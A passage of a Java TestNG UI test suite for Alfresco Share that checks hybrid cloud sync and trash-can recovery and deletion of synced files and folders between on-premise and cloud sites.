    @Test(groups = { "HybridSync", "Enterprise42" })
    public void ALF_15273() throws Exception
    {
        String testName = getTestName();
        String user1 = getUserNameForDomain(testName, testDomain);

        String opSiteName = getSiteName(testName) + "-OP";
        String cloudSiteName = getSiteName(testName) + "-CL";

        String file = testName + System.currentTimeMillis() + ".txt";

        ShareUser.login(drone, user1, DEFAULT_PASSWORD);

        ShareUser.openSitesDocumentLibrary(drone, opSiteName);

        ShareUser.uploadFileInFolder(drone, new String[] { file });

        DestinationAndAssigneeBean desAndAssBean = new DestinationAndAssigneeBean();
        desAndAssBean.setNetwork(testDomain);
        desAndAssBean.setSiteName(cloudSiteName);

        AbstractCloudSyncTest.syncContentToCloud(drone, file, desAndAssBean);

        ShareUser.selectContentCheckBox(drone, file);

        ShareUser.deleteSelectedContent(drone);

        ShareUser.logout(drone);

        ShareUser.login(hybridDrone, user1, DEFAULT_PASSWORD);

        DocumentLibraryPage docLibPage = ShareUser.openSitesDocumentLibrary(hybridDrone, cloudSiteName);

        Assert.assertFalse(docLibPage.isFileVisible(file));

        ShareUser.logout(hybridDrone);

        ShareUser.login(drone, user1, DEFAULT_PASSWORD);

        ShareUserProfile.navigateToTrashCan(drone);

        Assert.assertTrue(ShareUserProfile.isTrashCanItemPresent(drone, file));

        ShareUserProfile.recoverTrashCanItem(drone, file);

        Assert.assertFalse(ShareUserProfile.isTrashCanItemPresent(drone, file));

        docLibPage = ShareUser.openSitesDocumentLibrary(drone, opSiteName);

        docLibPage.isFileVisible(file);

        Assert.assertTrue(docLibPage.getFileDirectoryInfo(file).isViewCloudSyncInfoLinkPresent());
              
        Assert.assertTrue(AbstractCloudSyncTest.checkIfContentIsSynced(drone, file), "ALF-20445: sync is not happening!!");               

        ShareUser.logout(drone);

        ShareUser.login(hybridDrone, user1, DEFAULT_PASSWORD);

        docLibPage = ShareUser.openSitesDocumentLibrary(hybridDrone, cloudSiteName);        

        Assert.assertTrue(AbstractCloudSyncTest.checkIfContentIsSynced(hybridDrone, file));
        
        Assert.assertTrue(docLibPage.isFileVisible(file));

        ShareUser.logout(hybridDrone);

    }

     @Test(groups = { "DataPrepTrashCan", "HybridSync", "Enterprise42" })
    public void dataPrep_TrashCan_ALF_15274() throws Exception
    {
        String testName = getTestName();
        String user1 = getUserNameForDomain(testName, testDomain);
        String[] userInfo1 = new String[] { user1 };

        String cloudUser = getUserNameForDomain(testName, testDomain);
        String[] cloudUserInfo1 = new String[] { cloudUser };

        String opSiteName = getSiteName(testName) + "-OP";
        String cloudSiteName = getSiteName(testName) + "-CL";

        // Create User1 (On-premise)
        CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, userInfo1);

        // Create User1 (Cloud)
        CreateUserAPI.CreateActivateUser(hybridDrone, ADMIN_USERNAME, cloudUserInfo1);
        CreateUserAPI.upgradeCloudAccount(hybridDrone, ADMIN_USERNAME, testDomain, "1000");

        // Login to User1, set up the cloud sync
        ShareUser.login(drone, user1, DEFAULT_PASSWORD);
        signInToAlfrescoInTheCloud(drone, cloudUser, DEFAULT_PASSWORD);
        ShareUser.logout(drone);

        ShareUser.login(hybridDrone, user1, DEFAULT_PASSWORD);
        ShareUser.createSite(hybridDrone, cloudSiteName, SITE_VISIBILITY_PUBLIC);
        ShareUser.logout(hybridDrone);

        // Login as Enterprise user, create site
        ShareUser.login(drone, user1, DEFAULT_PASSWORD);
        ShareUser.createSite(drone, opSiteName, SITE_VISIBILITY_PUBLIC);
        ShareUser.logout(drone);

    }

    @Test(groups = { "HybridSync", "Enterprise42" })
    public void ALF_15274() throws Exception
    {
        String testName = getTestName();
        String user1 = getUserNameForDomain(testName, testDomain);
        
        String opSiteName = getSiteName(testName) + "-OP";
        String cloudSiteName = getSiteName(testName) + "-CL";
        
        String folderName = testName + System.currentTimeMillis();
        String file = getFileName(testName)+ System.currentTimeMillis()+".text";
        
        ShareUser.login(drone, user1, DEFAULT_PASSWORD);

        ShareUser.openSitesDocumentLibrary(drone, opSiteName);

        ShareUserSitePage.createFolder(drone, folderName, folderName);

        ShareUser.uploadFileInFolder(drone, new String[] { file });

        DestinationAndAssigneeBean desAndAssBean = new DestinationAndAssigneeBean();
        desAndAssBean.setNetwork(testDomain);
        desAndAssBean.setSiteName(cloudSiteName);
        AbstractCloudSyncTest.syncContentToCloud(drone, folderName, desAndAssBean);

        ShareUser.selectContentCheckBox(drone, folderName);

        ShareUser.deleteSelectedContent(drone);

        ShareUser.logout(drone);

        // Check the folder is removed on cloud
        ShareUser.login(hybridDrone, user1, DEFAULT_PASSWORD);

        DocumentLibraryPage doclib = ShareUser.openSiteDocumentLibraryFromSearch(hybridDrone, cloudSiteName);

        Assert.assertFalse(doclib.isFileVisible(folderName));

        ShareUser.logout(hybridDrone);

        // Check On-Premise
        ShareUser.login(drone, user1, DEFAULT_PASSWORD);

        ShareUserProfile.navigateToTrashCan(drone);

        Assert.assertTrue(ShareUserProfile.isTrashCanItemPresent(drone, folderName));

        ShareUserProfile.recoverTrashCanItem(drone, folderName);

        Assert.assertFalse(ShareUserProfile.isTrashCanItemPresent(drone, folderName));

        doclib = ShareUser.openSiteDocumentLibraryFromSearch(drone, opSiteName);

        doclib.isFileVisible(folderName);

        Assert.assertTrue(doclib.getFileDirectoryInfo(folderName).isViewCloudSyncInfoLinkPresent());

        Assert.assertTrue(AbstractCloudSyncTest.checkIfContentIsSynced(drone, file),"ALF-20445: sync is not happening!!");     
        
        ShareUser.logout(drone);

        ShareUser.login(hybridDrone, user1, DEFAULT_PASSWORD);

        doclib = ShareUser.openSiteDocumentLibraryFromSearch(hybridDrone, cloudSiteName);

        Assert.assertTrue(doclib.isFileVisible(folderName));

        Assert.assertTrue(doclib.getFileDirectoryInfo(folderName).isCloudSynced());
        
        // Open Folder
        doclib = doclib.selectFolder(folderName).render();

        Assert.assertTrue(doclib.isFileVisible(file));
        ShareUser.logout(hybridDrone);

    }

     @Test(groups = { "DataPrepTrashCan", "HybridSync", "Enterprise42" })
    public void dataPrep_TrashCan_ALF_15275() throws Exception
    {
        String testName = getTestName();
        String user1 = getUserNameForDomain(testName, testDomain);
        String[] userInfo1 = new String[] { user1 };

        String cloudUser = getUserNameForDomain(testName, testDomain);
        String[] cloudUserInfo1 = new String[] { cloudUser };

        String opSiteName = getSiteName(testName) + "-OP";
        String cloudSiteName = getSiteName(testName) + "-CL";

        // Create User1 (On-premise)
        CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, userInfo1);

        // Create User1 (Cloud)
        CreateUserAPI.CreateActivateUser(hybridDrone, ADMIN_USERNAME, cloudUserInfo1);
        CreateUserAPI.upgradeCloudAccount(hybridDrone, ADMIN_USERNAME, testDomain, "1000");

        // Login to User1, create site, set up the cloud sync
        ShareUser.login(drone, user1, DEFAULT_PASSWORD);
        signInToAlfrescoInTheCloud(drone, cloudUser, DEFAULT_PASSWORD);
        ShareUser.createSite(drone, opSiteName, SITE_VISIBILITY_PUBLIC);
       
        ShareUser.logout(drone);

        ShareUser.login(hybridDrone, user1, DEFAULT_PASSWORD);
        ShareUser.createSite(hybridDrone, cloudSiteName, SITE_VISIBILITY_PUBLIC);
        ShareUser.logout(hybridDrone);
    }

    @Test(groups = {"HybridSync", "Enterprise42" })
    public void ALF_15275() throws Exception
    {
        String testName = getTestName();
        String user1 = getUserNameForDomain(testName, testDomain);

        String opSiteName = getSiteName(testName) + "-OP";
        String cloudSiteName = getSiteName(testName) + "-CL";

        String file = testName + System.currentTimeMillis() + ".txt";

        ShareUser.login(drone, user1, DEFAULT_PASSWORD);

        ShareUser.openSitesDocumentLibrary(drone, opSiteName);

        ShareUser.uploadFileInFolder(drone, new String[] { file });

        DestinationAndAssigneeBean desAndAssBean = new DestinationAndAssigneeBean();
        desAndAssBean.setNetwork(testDomain);
        desAndAssBean.setSiteName(cloudSiteName);
        AbstractCloudSyncTest.syncContentToCloud(drone, file, desAndAssBean);

        ShareUser.selectContentCheckBox(drone, file);

        ShareUser.deleteSelectedContent(drone);

        ShareUser.logout(drone);

        // Check on Cloud
        ShareUser.login(hybridDrone, user1, DEFAULT_PASSWORD);

        DocumentLibraryPage docLibPage = ShareUser.openSiteDocumentLibraryFromSearch(hybridDrone, cloudSiteName);

        Assert.assertFalse(docLibPage.isFileVisible(file));

        ShareUser.logout(hybridDrone);

        // Check On Premise
        ShareUser.login(drone, user1, DEFAULT_PASSWORD);

        ShareUserProfile.navigateToTrashCan(drone);

        Assert.assertTrue(ShareUserProfile.isTrashCanItemPresent(drone, file));

        ShareUserProfile.deleteTrashCanItem(drone, file);

        Assert.assertFalse(ShareUserProfile.isTrashCanItemPresent(drone, file));

        docLibPage = ShareUser.openSiteDocumentLibraryFromSearch(drone, opSiteName);

        Assert.assertFalse(docLibPage.isFileVisible(file));

        ShareUser.logout(drone);

        // Check On Cloud

        ShareUser.login(hybridDrone, user1, DEFAULT_PASSWORD);

        docLibPage = ShareUser.openSiteDocumentLibraryFromSearch(hybridDrone, cloudSiteName);

        Assert.assertFalse(docLibPage.isFileVisible(file));

        ShareUser.logout(hybridDrone);

    }

     @Test(groups = { "DataPrepTrashCan", "HybridSync", "Enterprise42" })
    public void dataPrep_TrashCan_ALF_15276() throws Exception
    {
        String testName = getTestName();
        String user1 = getUserNameForDomain(testName, testDomain);
        String[] userInfo1 = new String[] { user1 };

        String cloudUser = getUserNameForDomain(testName, testDomain);
        String[] cloudUserInfo1 = new String[] { cloudUser };

        String opSiteName = getSiteName(testName) + "-OP";
        String cloudSiteName = getSiteName(testName) + "-CL";

        // Create User1 (On-premise)
        CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, userInfo1);

        // Create User1 (Cloud)
        CreateUserAPI.CreateActivateUser(hybridDrone, ADMIN_USERNAME, cloudUserInfo1);
        CreateUserAPI.upgradeCloudAccount(hybridDrone, ADMIN_USERNAME, testDomain, "1000");

        // Login to User1, create site, set up the cloud sync
        ShareUser.login(drone, user1, DEFAULT_PASSWORD);
        ShareUser.createSite(drone, opSiteName, SITE_VISIBILITY_PUBLIC);
        signInToAlfrescoInTheCloud(drone, user1, DEFAULT_PASSWORD);
        ShareUser.logout(drone);

        ShareUser.login(hybridDrone, cloudUser, DEFAULT_PASSWORD);
        ShareUser.createSite(hybridDrone, cloudSiteName, SITE_VISIBILITY_PUBLIC);
        ShareUser.logout(hybridDrone);
    }

    @Test(groups = { "HybridSync", "Enterprise42" })
    public void ALF_15276() throws Exception
    {
        String testName = getTestName();
        String user1 = getUserNameForDomain(testName, testDomain);

        String opSiteName = getSiteName(testName) + "-OP";
        String cloudSiteName = getSiteName(testName) + "-CL";
        String file = getFileName(testName)+ System.currentTimeMillis()+".text";
        String folderName = testName + System.currentTimeMillis();

        ShareUser.login(drone, user1, DEFAULT_PASSWORD);

        ShareUser.openSitesDocumentLibrary(drone, opSiteName);

        ShareUserSitePage.createFolder(drone, folderName, folderName);  
        ShareUser.uploadFileInFolder(drone, new String[] { file });

        DestinationAndAssigneeBean desAndAssBean = new DestinationAndAssigneeBean();
        desAndAssBean.setNetwork(testDomain);
        desAndAssBean.setSiteName(cloudSiteName);
        AbstractCloudSyncTest.syncContentToCloud(drone, folderName, desAndAssBean);
       
        ShareUser.selectContentCheckBox(drone, folderName);

        ShareUser.deleteSelectedContent(drone);

        ShareUser.logout(drone);

        // Check On Cloud
        ShareUser.login(hybridDrone, user1, DEFAULT_PASSWORD);

        Assert.assertFalse(ShareUser.openSiteDocumentLibraryFromSearch(hybridDrone, cloudSiteName).isFileVisible(folderName));

        ShareUser.logout(hybridDrone);

        // Check On Premise
        ShareUser.login(drone, user1, DEFAULT_PASSWORD);

        ShareUserProfile.navigateToTrashCan(drone);

        Assert.assertTrue(ShareUserProfile.isTrashCanItemPresent(drone, folderName));

        ShareUserProfile.deleteTrashCanItem(drone, folderName);

        Assert.assertFalse(ShareUserProfile.isTrashCanItemPresent(drone, folderName));

        DocumentLibraryPage docLibPage = ShareUser.openSiteDocumentLibraryFromSearch(drone, opSiteName);

        docLibPage.isFileVisible(folderName);

        ShareUser.logout(drone);

        // Check On Cloud

        ShareUser.login(hybridDrone, user1, DEFAULT_PASSWORD);

        Assert.assertFalse(ShareUser.openSiteDocumentLibraryFromSearch(hybridDrone, cloudSiteName).isFileVisible(folderName));

        ShareUser.logout(hybridDrone);

    }

   @Test(groups = { "DataPrepTrashCan" }) 
    public void dataPrep_TrashCan_ALF_15285() throws Exception
    {

        String testName = getTestName();
        String trashcanUser = getUserNameForDomain(testName, testDomainFree);
        CreateUserAPI.CreateActivateUser(drone, adminUserFree, new String[] { trashcanUser });
    }

    @Test(groups = { "TrashCan" })
    public void ALF_15285() throws Exception
    {

        String testName = getTestName();
        String trashcanUser = getUserNameForDomain(testName, testDomainFree);
        String siteName1 = getSiteName(testName) + System.currentTimeMillis();

        String folder = getFolderName(testName) + System.currentTimeMillis();
        String fileName = getFileName(testName) + System.currentTimeMillis();

        ShareUser.login(drone, trashcanUser, DEFAULT_PASSWORD);

        SiteUtil.createSite(drone, siteName1, siteName1, SITE_VISIBILITY_PUBLIC, true);

        ShareUser.openSitesDocumentLibrary(drone, siteName1);

        ShareUser.uploadFileInFolder(drone, new String[] { fileName });

        DocumentLibraryPage docLibPage = ShareUserSitePage.createFolder(drone, folder, folder);

        ShareUser.selectContentCheckBox(drone, folder);
        ShareUser.selectContentCheckBox(drone, fileName);
        ShareUser.deleteSelectedContent(drone);

        SiteUtil.deleteSite(drone, siteName1);

        ShareUserProfile.navigateToTrashCan(drone);
        
        try
        {
            ShareUserProfile.recoverTrashCanItem(drone, fileName).render();
            Assert.fail("Expected error: Failed to recover: is not displayed");
        }
        catch(ShareException se)
        {                    
            //Continue On Expected Exception
            Assert.assertTrue(("Failed to recover").equalsIgnoreCase(se.getMessage()));
        }
               
        Assert.assertTrue(StringUtils.isEmpty(ShareUserProfile.getTrashCanItem(drone, folder).getFolderPath()));      

        ShareUserProfile.recoverTrashCanItem(drone, siteName1);

        Assert.assertTrue(ShareUserProfile.getTrashCanItem(drone, folder).getFolderPath().endsWith(DOCLIB_CONTAINER));

        ShareUserProfile.recoverTrashCanItem(drone, fileName);

        ShareUserProfile.recoverTrashCanItem(drone, folder);

        docLibPage = ShareUser.openSiteDocumentLibraryFromSearch(drone, siteName1);

        Assert.assertTrue(docLibPage.isFileVisible(fileName));
        Assert.assertTrue(docLibPage.isFileVisible(folder));

    }
    
    
}
